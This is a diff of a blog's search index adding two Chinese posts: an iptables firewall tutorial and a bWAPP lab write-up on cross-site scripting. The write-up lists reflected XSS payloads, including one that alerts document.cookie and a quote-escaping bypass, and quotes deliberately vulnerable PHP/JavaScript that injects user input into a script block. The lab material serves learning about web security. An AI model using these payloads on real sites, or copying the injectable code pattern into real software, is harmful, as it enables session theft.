@@ -1,6 +1,308 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>iptables</title>
+    <url>/2021/01/05/iptables/</url>
+    <content><![CDATA[<h1 id="必读iptables"><a href="#必读iptables" class="headerlink" title="必读iptables"></a>必读<a href="https://www.zsythink.net/archives/1199" target="_blank" rel="noopener">iptables</a></h1><h1 id="iptables概念"><a href="#iptables概念" class="headerlink" title="iptables概念"></a>iptables概念</h1><p><strong>iptables</strong>(<strong>包过滤防火墙,工作在TCP/IP的2、3、4层</strong>)其实不是真正的防火墙，我们可以把它理解成一个客户端代理，用户通过iptables这个代理，将用户的安全设定执行到对应的”安全框架”中，这个”安全框架”才是真正的防火墙，这个框架的名字叫<strong>netfilter</strong>,netfilter才是防火墙真正的安全框架（framework），netfilter位于内核空间iptables其实是一个命令行工具，位于用户空间，我们用这个工具操作真正的框架。</p>
+<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><h3 id="4张表"><a href="#4张表" class="headerlink" title="4张表"></a>4张表</h3><table>
+<thead>
+<tr>
+<th>filter表</th>
+<th>负责过滤功能，防火墙；内核模块：iptables_filter</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>nat表</td>
+<td>network address translation，网络地址转换功能；内核模块：iptable_nat</td>
+</tr>
+<tr>
+<td>mangle表</td>
+<td>拆解报文，做出修改，并重新封装 的功能；iptable_mangle</td>
+</tr>
+<tr>
+<td>raw表</td>
+<td>关闭nat表上启用的连接追踪机制；iptable_raw</td>
+</tr>
+</tbody></table>
+<h3 id="5条链"><a href="#5条链" class="headerlink" title="5条链"></a>5条链</h3><p>INPUT、OUTPUT、FORWARD、POSTROUTING、PREROUTING</p>
+<p>优先级次序（由高而低）：raw –&gt; mangle –&gt; nat –&gt; filter</p>
+<table>
+<thead>
+<tr>
+<th>raw 表中的规则可以被哪些链使用</th>
+<th>PREROUTING，OUTPUT</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mangle  表中的规则可以被哪些链使用</td>
+<td>PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</td>
+</tr>
+<tr>
+<td>nat   表中的规则可以被哪些链使用</td>
+<td>PREROUTING，OUTPUT，POSTROUTING（centos7中还有INPUT，centos6中没有）</td>
+</tr>
+<tr>
+<td>filter  表中的规则可以被哪些链使用</td>
+<td>INPUT，FORWARD，OUTPUT</td>
+</tr>
+</tbody></table>
+<p><img src="/2021/01/05/iptables/9.png" alt="t"></p>
+<h1 id="iptables常规操作"><a href="#iptables常规操作" class="headerlink" title="iptables常规操作"></a>iptables常规操作</h1><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables --line -t 表名 -nvxL [链名]</span><br><span class="line"><span class="meta">#</span><span class="bash">省略<span class="string">"-t 表名"</span>时，默认表示操作filter表</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-L     表示列出规则</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-v     表示verbose，表示详细的，冗长的</span></span><br><span class="line"><span class="meta">#</span><span class="bash">--line 显示规则的序号</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-n     表示不解析IP地址</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-x		表示显示计数器的精确值</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>pkts</th>
+<th>对应规则匹配到的报文的个数。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>bytes</strong></td>
+<td>对应匹配到的报文包的大小总和</td>
+</tr>
+<tr>
+<td><strong>target</strong></td>
+<td>规则对应的target，往往表示规则对应的”动作”，即规则匹配成功后需要采取的措施。</td>
+</tr>
+<tr>
+<td><strong>prot</strong></td>
+<td>表示规则对应的协议，是否只针对某些协议应用此规则。</td>
+</tr>
+<tr>
+<td><strong>opt</strong></td>
+<td>表示规则对应的选项。</td>
+</tr>
+<tr>
+<td><strong>in</strong></td>
+<td>表示数据包由哪个接口(网卡)流入，我们可以设置通过哪块网卡流入的报文需要匹配当前规则</td>
+</tr>
+<tr>
+<td><strong>out</strong></td>
+<td>表示数据包由哪个接口(网卡)流出，我们可以设置通过哪块网卡流出的报文需要匹配当前规则。</td>
+</tr>
+<tr>
+<td><strong>source</strong></td>
+<td>表示规则对应的源头地址，可以是一个IP，也可以是一个网段。</td>
+</tr>
+<tr>
+<td><strong>destination</strong></td>
+<td>表示规则对应的目标地址。可以是一个IP，也可以是一个网段</td>
+</tr>
+</tbody></table>
+<h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t 表名 -A 链名 匹配条件 -j 动作</span><br><span class="line"><span class="meta">#</span><span class="bash">-A			选项表示在对应链的末尾添加规则[-I  表示在对应链的头部添加规则]</span></span><br><span class="line">iptables -t 表名 -I 链名 规则序号 匹配条件 -j 动作</span><br><span class="line"><span class="meta">#</span><span class="bash">规则序号	  在指定表的指定链的指定位置添加一条规则</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t 表名 -D 链名 规则序号</span><br><span class="line"><span class="meta">#</span><span class="bash">删除指定表的指定链的指定规则 [通过规则序号匹配删除]</span></span><br><span class="line">iptables -t 表名 -D 链名 匹配条件 -j 动作</span><br><span class="line"><span class="meta">#</span><span class="bash">通过匹配条件和匹配动作删除</span></span><br><span class="line">iptables -t 表名 -F 链名</span><br><span class="line"><span class="meta">#</span><span class="bash">删除指定表的指定链中的所有规则</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t 表名 -R 链名 规则序号 规则原本的匹配条件 -j 动作</span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -t filter -R INPUT 3 -s 192.168.1.146 -j ACCEPT</span></span><br><span class="line"><span class="meta">#</span><span class="bash">修改filter表中INPUT链的第3条规则，将这条规则的动作修改为ACCEPT， -s 192.168.1.146为这条规则中原本的匹配条件，如果省略此匹配条件，修改后的规则中的源地址可能会变为0.0.0.0/0。</span></span><br><span class="line"></span><br><span class="line">iptables -t 表名 -P 链名 动作</span><br><span class="line"><span class="meta">#</span><span class="bash">指定表的指定链的默认策略（默认动作），并非添加规则。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -t filter -P FORWARD ACCEPT</span></span><br><span class="line"><span class="meta">#</span><span class="bash">将filter表中FORWARD链的默认策略设置为ACCEPT</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="保存规则"><a href="#保存规则" class="headerlink" title="保存规则"></a>保存规则</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service iptables save</span><br><span class="line"><span class="meta">#</span><span class="bash">centos7</span></span><br><span class="line">iptables-save &gt; /etc/sysconfig/iptables</span><br><span class="line"><span class="meta">#</span><span class="bash">从指定的文件载入规则，注意：重载规则时，文件中的规则将会覆盖现有规则</span></span><br><span class="line">iptables-restore &lt; /etc/sysconfig/iptables</span><br></pre></td></tr></table></figure>
+
+<h2 id="匹配条件"><a href="#匹配条件" class="headerlink" title="匹配条件"></a>匹配条件</h2><p>iptables -t 表名 -A 链名 规则序号 <strong>匹配条件</strong> -j 动作</p>
+<h3 id="基本匹配条件"><a href="#基本匹配条件" class="headerlink" title="基本匹配条件"></a>基本匹配条件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t 表名 -I 链名  -p 协议 ! -s 报文的源地址 -d 报文目的地址 -i 入网卡 -o 出网卡 -j 动作</span><br><span class="line"><span class="meta">#</span><span class="bash"> ! 取反匹配</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-p 协议匹配[tcp/udp/icmp]</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-s 用于匹配报文的源地址,可以同时指定多个源地址，每个IP之间用逗号隔开，也可以指定为一个网段。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-i	用于匹配报文是从哪个网卡接口流入本机的，由于匹配条件只是用于匹配报文流入的网卡，所以在OUTPUT链与POSTROUTING链中不能使用此选项。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-o用于匹配报文将要从哪个网卡接口流出本机，于匹配条件只是用于匹配报文流出的网卡，所以在INPUT链与PREROUTING链中不能使用此选项。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -t filter -I INPUT -p tcp ! -s 192.168.80.1,192.168.80.2 -d 192.168.80.3 -i eth0  -j ACCEPT</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="扩展匹配条件"><a href="#扩展匹配条件" class="headerlink" title="扩展匹配条件"></a>扩展匹配条件</h3><h4 id="tcp扩展模块"><a href="#tcp扩展模块" class="headerlink" title="tcp扩展模块"></a>tcp扩展模块</h4><p>只对TCP协议报文进行端口匹配</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-p tcp -m tcp --sport 用于匹配tcp协议报文的源端口，可以使用冒号指定一个连续的端口范围</span><br><span class="line">-p tcp -m tcp --dport 用于匹配tcp协议报文的目标端口，可以使用冒号指定一个连续的端口范围</span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -t filter -I OUTPUT -d 192.168.1.146 -p tcp -m tcp --sport 22:33 -j REJECT</span></span><br><span class="line"></span><br><span class="line">--tcp-flags 用于匹配报文的tcp头的标志位</span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -t filter -I INPUT -p tcp -m tcp --tcp-flags SYN,ACK,FIN,RST,URG,PSH SYN,ACK -j REJERCT</span></span><br><span class="line"><span class="meta">#</span><span class="bash">把标志位的SYN和ACK值置为1</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="UCP扩展模块"><a href="#UCP扩展模块" class="headerlink" title="UCP扩展模块"></a>UCP扩展模块</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--sport：匹配udp报文的源地址</span><br><span class="line">--dport：匹配udp报文的目标地址</span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -t filter -I INPUT -p udp -m udp --dport 137:157 -j ACCEPT</span></span><br><span class="line"><span class="meta">#</span><span class="bash">可以结合multiport模块指定多个离散的端口</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="icmp扩展模块"><a href="#icmp扩展模块" class="headerlink" title="icmp扩展模块"></a>icmp扩展模块</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--icmp-type：匹配icmp报文的具体类型</span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -t filter -I INPUT -p icmp -m icmp --icmp-type 8/0 -j REJECT</span></span><br></pre></td></tr></table></figure>
+
+<p>各种ICMP报文的前32bits都是三个长度固定的字段：type类型字段(8位)、code代码字段(8位)、checksum校验和字段(16位)<br>8bits类型和8bits代码字段：一起决定了ICMP报文的类型。常见的有：<br>　　类型8、代码0：回射请求。<br>　　类型0、代码0：回射应答。<br>　　类型11、代码0：超时。</p>
+<p><a href="https://blog.csdn.net/weixin_34238633/article/details/91505833" target="_blank" rel="noopener">icmp报文的具体类型</a></p>
+<h4 id="multiport扩展模块"><a href="#multiport扩展模块" class="headerlink" title="multiport扩展模块"></a>multiport扩展模块</h4><p>可对TCP/UDP多种报文端口进行匹配</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t 表名 -I 链名  -p 协议 -m multiport --sport 端口号 -j 动作</span><br><span class="line"><span class="meta">#</span><span class="bash">-p tcp -m multiport --sports 用于匹配报文的源端口，可以指定离散的多个端口号,端口之间用<span class="string">"逗号"</span>隔开</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-p udp -m multiport --dports 用于匹配报文的目标端口，可以指定离散的多个端口号，端口之间用<span class="string">"逗号"</span>隔开</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="iprange扩展模块"><a href="#iprange扩展模块" class="headerlink" title="iprange扩展模块"></a>iprange扩展模块</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--src-range：指定连续的源地址范围</span><br><span class="line">-dst-range：指定连续的目标地址范围</span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -t filter -I INPUT -m iprange --src-range 192.168.1.127-192.168.1.146 -j DROP</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="string模块"><a href="#string模块" class="headerlink" title="string模块"></a>string模块</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--algo：指定对应的匹配算法，可用算法为bm、kmp，此选项为必需选项。</span><br><span class="line">--string：指定需要匹配的字符串</span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -t filter -I INPUT -p tcp --sport 80 -m string --algo bm --string <span class="string">"OOXX"</span> -j REJECT</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="time模块"><a href="#time模块" class="headerlink" title="time模块"></a>time模块</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--timestart：用于指定时间范围的开始时间，不可取反</span><br><span class="line">--timestop：用于指定时间范围的结束时间，不可取反</span><br><span class="line">--weekdays：用于指定"星期几"，可取反</span><br><span class="line">--monthdays：用于指定"几号"，可取反</span><br><span class="line">--datestart：用于指定日期范围的开始日期，不可取反</span><br><span class="line">--datestop：用于指定日期范围的结束时间，不可取反</span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -t filter -I OUTPUT -p tcp --dport 80 </span></span><br><span class="line"><span class="meta">#</span><span class="bash">-m time --timestart 09:00:00 --timestop 19:00:00 --weekdays 6,7 </span></span><br><span class="line"><span class="meta">#</span><span class="bash">--monthdays 22,23 --datestart 2017-12-24 --datestop 2017-12-27</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-j REJECT</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="connlimit-模块"><a href="#connlimit-模块" class="headerlink" title="connlimit 模块"></a>connlimit 模块</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--connlimit-above：单独使用此选项时，表示限制每个IP的链接数量。</span><br><span class="line">--connlimit-mask：此选项不能单独使用，在使用--connlimit-above选项时，配合此选项，则可以针对"某类IP段内的一定数量的IP"进行连接数量的限制，如果不明白可以参考上文的详细解释。</span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -t filter -I OUTPUT -p tcp --dport 22 -m connlimit --connlimit-above 2 --connlimit-mask 24 -j REJECT</span></span><br><span class="line"><span class="meta">#</span><span class="bash">--connlimit-above 表示一个IP最多只能创建两个连接</span></span><br><span class="line"><span class="meta">#</span><span class="bash">--connlimit-mask 表示在包含254(由mask 24得254)个IP的C类网络中最多只能有两个SSH连接</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="limit模块"><a href="#limit模块" class="headerlink" title="limit模块"></a>limit模块</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--limit-burst：类比"令牌桶"算法，此选项用于指定令牌桶中令牌的最大数量，上文中已经详细的描述了"令牌桶"的概念，方便回顾。</span><br><span class="line">--limit：类比"令牌桶"算法，此选项用于指定令牌桶中生成新令牌的频率，可用时间单位有second、minute 、hour、day。</span><br><span class="line"><span class="meta">#</span><span class="bash">ptables -t filter -I OUTPUT -p icmp -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 10/minute --<span class="built_in">limit</span>-burst 3 -j ACCEPT</span></span><br><span class="line"><span class="meta">#</span><span class="bash">木桶最多放3个令牌（icmp持令牌入网卡）</span></span><br><span class="line"><span class="meta">#</span><span class="bash">每分钟生产10个令牌[每6秒生成一个令牌]（如果木桶内存在3个令牌则丢弃第4个令牌）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">使用<span class="string">"--limit"</span>选项时，可以选择的时间单位有多种，如下</span></span><br><span class="line"><span class="meta">#</span><span class="bash">/second</span></span><br><span class="line"><span class="meta">#</span><span class="bash">/minute</span></span><br><span class="line"><span class="meta">#</span><span class="bash">/hour</span></span><br><span class="line"><span class="meta">#</span><span class="bash">/day</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="state模块"><a href="#state模块" class="headerlink" title="state模块"></a>state模块</h4><p>对于state模块的连接而言，”连接”其中的报文可以分为5种状态，报文状态可以为NEW、ESTABLISHED、RELATED、INVALID、UNTRACKED</p>
+<table>
+<thead>
+<tr>
+<th><strong>NEW</strong></th>
+<th>连接中的第一个包，状态就是NEW，我们可以理解为新连接的第一个包的状态为NEW。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>ESTABLISHED</strong></td>
+<td>我们可以把NEW状态包后面的包的状态理解为ESTABLISHED，表示连接已建立。</td>
+</tr>
+<tr>
+<td><strong>RELATED</strong></td>
+<td>进程间的关联</td>
+</tr>
+<tr>
+<td><strong>INVALID</strong></td>
+<td>如果一个包没有办法被识别，或者这个包没有任何状态，那么这个包的状态就是INVALID，我们可以主动屏蔽状态为INVALID的报文。</td>
+</tr>
+<tr>
+<td><strong>UNTRACKED</strong></td>
+<td>报文的状态为untracked时，表示报文未被追踪，当报文的状态为Untracked时通常表示无法找到相关的连接</td>
+</tr>
+</tbody></table>
+<h1 id="白名单-黑名单"><a href="#白名单-黑名单" class="headerlink" title="白名单/黑名单"></a>白名单/黑名单</h1><p>当链的默认策略为ACCEPT时，链中的规则对应的动作应该为DROP或者REJECT，表示只有匹配到规则的报文才会被拒绝，没有被规则匹配到的报文都会被默认接受，这就是<strong>黑名单机制</strong>。<br>       当链的默认策略为DROP时，链中的规则对应的动作应该为ACCEPT，表示只有匹配到规则的报文才会被放行，没有被规则匹配到的报文都会被默认拒绝，这就是<strong>白名单机制</strong>。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t INPUT -P ACCEPT      				 #先将INPUT链的默认策略设置为ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 20 -j ACCEPT	 #添加白名单</span><br><span class="line">iptables -A INPUT -j REJECT						 #拒绝其他</span><br></pre></td></tr></table></figure>
+
+<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="自定义链"><a href="#自定义链" class="headerlink" title="自定义链"></a>自定义链</h1><h2 id="创建自定义链"><a href="#创建自定义链" class="headerlink" title="创建自定义链"></a>创建自定义链</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t 表名 -N 链名</span><br><span class="line"><span class="meta">#</span><span class="bash">在表中创建自定义链</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="引用自定义链"><a href="#引用自定义链" class="headerlink" title="引用自定义链"></a>引用自定义链</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t 表名 -I 默认链名  -j 自定义链</span><br></pre></td></tr></table></figure>
+
+<h2 id="重命名自定义链"><a href="#重命名自定义链" class="headerlink" title="重命名自定义链"></a>重命名自定义链</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -E 自定义链</span><br></pre></td></tr></table></figure>
+
+<h2 id="删除自定义链"><a href="#删除自定义链" class="headerlink" title="删除自定义链"></a>删除自定义链</h2><p>删除自定义链需要满足两个条件</p>
+<p>1、自定义链没有被引用</p>
+<p>2、自定义链中没有任何规则</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -X 自定义链</span><br></pre></td></tr></table></figure>
+
+<h1 id="iptables动作"><a href="#iptables动作" class="headerlink" title="iptables动作"></a>iptables动作</h1><h2 id="动作REJECT"><a href="#动作REJECT" class="headerlink" title="动作REJECT"></a>动作REJECT</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--reject-with 可以设置提示信息，当对方被拒绝时，会提示对方为什么被拒绝</span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -I INPUT -j REJECT --reject-with icmp-error</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="动作LOG"><a href="#动作LOG" class="headerlink" title="动作LOG"></a>动作LOG</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">修改/etc/rsyslog.conf文件（或者/etc/syslog.conf），在rsyslog配置文件中添加如下配置即可。</span></span><br><span class="line">vim /etc/rsyslog.conf</span><br><span class="line">kern.warning /var/log/iptables.log</span><br><span class="line"><span class="meta">#</span><span class="bash">加入上述配置后，报文的相关信息将会被记录到/var/<span class="built_in">log</span>/iptables.log文件中。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">完成上述配置后，重启rsyslog服务（或者syslogd）</span></span><br><span class="line">service rsyslog restart</span><br><span class="line"><span class="meta">#</span><span class="bash">服务重启后，配置即可生效，匹配到的报文的相关信息将被记录到指定的文件中。</span></span><br><span class="line"></span><br><span class="line">--log-level选项可以指定记录日志的日志级别，可用级别有emerg，alert，crit，error，warning，notice，info，debug。</span><br><span class="line">--log-prefix选项可以给记录到的相关信息添加"标签"之类的信息，以便区分各种记录到的报文信息，方便在分析时进行过滤。</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -I INPUT -p tcp --dport 22 -m state --state NEW -j LOG --<span class="built_in">log</span>-prefix <span class="string">"connport-22"</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="动作SNAT"><a href="#动作SNAT" class="headerlink" title="动作SNAT"></a>动作SNAT</h2><p>私网IP—&gt;固定公网IP</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -s IP网段 -j SNAT --to-source 公网IP</span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -t nat -A POSTROUTING -s 10.1.0.0/24 -j SNAT --to-source 1.2.3.4</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="动作DNAT"><a href="#动作DNAT" class="headerlink" title="动作DNAT"></a>动作DNAT</h2><p>固定公网IP—&gt;私网IP</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -d 公网IP -p 协议 --dport 端口号 -j DNAT --to-destination 内网IP:端口号 </span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -t nat -A PREROUTING -d 1.2.3.4 -p tcp --dport 3389 -j DNAT --to-destination 10.1.0.6:3389</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="动作MASQUERADE"><a href="#动作MASQUERADE" class="headerlink" title="动作MASQUERADE"></a>动作MASQUERADE</h2><p>私网IP—&gt;动态公网IP</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -s IP网段 -o 出网卡 -j SNAT </span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -t nat -A POSTROUTING -s 10.1.0.0/24 -o eth0 	-j MASQUERADE</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="动作REDIRECT"><a href="#动作REDIRECT" class="headerlink" title="动作REDIRECT"></a>动作REDIRECT</h2><p>使用REDIRECT动作可以在本机上进行端口映射</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 源端口 -j REDIRECT --to-ports 目的端口</span><br><span class="line"><span class="meta">#</span><span class="bash">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span></span><br><span class="line"><span class="meta">#</span><span class="bash">将本机的80端口映射到本机的8080端口上</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="iptables配置技巧"><a href="#iptables配置技巧" class="headerlink" title="iptables配置技巧"></a>iptables配置技巧</h1><p><strong>1</strong>、规则的顺序非常重要 针对相同服务的规则，更严格的规则应该放在前面。</p>
+<p><strong>2</strong>、当规则中有多个匹配条件时，条件之间默认存在”与”的关系。报文必须同时满足这个规则中的所有匹配条件，报文才能被这条规则匹配到</p>
+<p><strong>3</strong>、在不考虑1的情况下，应该将更容易被匹配到的规则放置在前面。</p>
+<p><strong>4</strong>、当IPTABLES所在主机作为网络防火 墙时，在配置规则时，应着重考虑方向性，双向都要考虑，从外到内，从内到外。</p>
+<p><strong>5</strong>、在配置IPTABLES白名单时，往往会将链的默认策略设置为ACCEPT，通过在链的最后设置REJECT规则实现白名单机制，而不是将链的默认策略设置为DROP，如果将链的默认策略设置为DROP，当链中的规则被清空时，管理员的请求也将会被DROP掉。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>bWAPP-XSS</title>
+    <url>/2020/09/27/bWAPP-XSS/</url>
+    <content><![CDATA[<h1 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><a href="https://blog.csdn.net/hee_mee/article/details/107392651" target="_blank" rel="noopener">xss</a></p>
+<h1 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><h3 id="GET-POST型"><a href="#GET-POST型" class="headerlink" title="GET/POST型"></a>GET/POST型</h3><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/&lt;script&gt;alert(007)&lt;/</span>script&gt;</span><br><span class="line"><span class="comment">//&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 字符 ' " \ 为转义为 \'  \"  \\</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_check_4</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).</span></span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;<span class="regexp">/script&gt; /</span><span class="regexp">/报错</span></span><br><span class="line"><span class="regexp">&lt;script&gt;alert(/</span>XSS/)&lt;<span class="regexp">/script&gt;  /</span><span class="regexp">/成功</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/在javascript 中 /</span> 和 <span class="string">" 可起到一样的作用 </span></span><br><span class="line"><span class="string">//&lt;script&gt;alert(007)&lt;/script&gt;  				//成功</span></span><br><span class="line"><span class="string">//&lt;script&gt;alert(document.cookie)&lt;/script&gt;   //成功</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//特殊被转义为HTML实体，无法绕过</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_check_3</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// htmlspecialchars - converts special characters to HTML entities    </span></span><br><span class="line">    <span class="comment">// '&amp;' (ampersand) becomes '&amp;amp;' </span></span><br><span class="line">    <span class="comment">// '"' (double quote) becomes '&amp;quot;' when ENT_NOQUOTES is not set</span></span><br><span class="line">    <span class="comment">// "'" (single quote) becomes '&amp;#039;' (or &amp;apos;) only when ENT_QUOTES is set</span></span><br><span class="line">    <span class="comment">// '&lt;' (less than) becomes '&amp;lt;'</span></span><br><span class="line">    <span class="comment">// '&gt;' (greater than) becomes '&amp;gt;'  </span></span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding);</span><br><span class="line">       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="JSON反射"><a href="#JSON反射" class="headerlink" title="JSON反射"></a>JSON反射</h3><h4 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h4><h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><p>关键代码如下</p>
+<p>通过URL获得字段<code>$title</code>，并在数组中查询,如果找不到就返回JSON数据。</p>
+<p>通过<a href="https://www.runoob.com/js/javascript-json-parse.html" target="_blank" rel="noopener">JSON.parse()</a>J将数据转换为 JavaScript 对象</p>
+<p>故可控制<code>$title</code>值对<code>&lt;script&gt;</code>进行闭合</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(! in_array(strtoupper($title), $movies))&#123;</span><br><span class="line">	$string = <span class="string">'&#123;"movies":[&#123;"response":"'</span> . $title . <span class="string">'??? Sorry, we don&amp;#039;t have that movie :("&#125;]&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">		<span class="keyword">var</span> JSONResponseString = <span class="string">'&lt;?php echo $string ?&gt;'</span>;</span><br><span class="line">     	<span class="comment">// var JSONResponse = eval ("(" + JSONResponseString + ")");</span></span><br><span class="line">        <span class="keyword">var</span> JSONResponse = <span class="built_in">JSON</span>.parse(JSONResponseString);</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">"result"</span>).innerHTML=JSONResponse.movies[<span class="number">0</span>].response;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
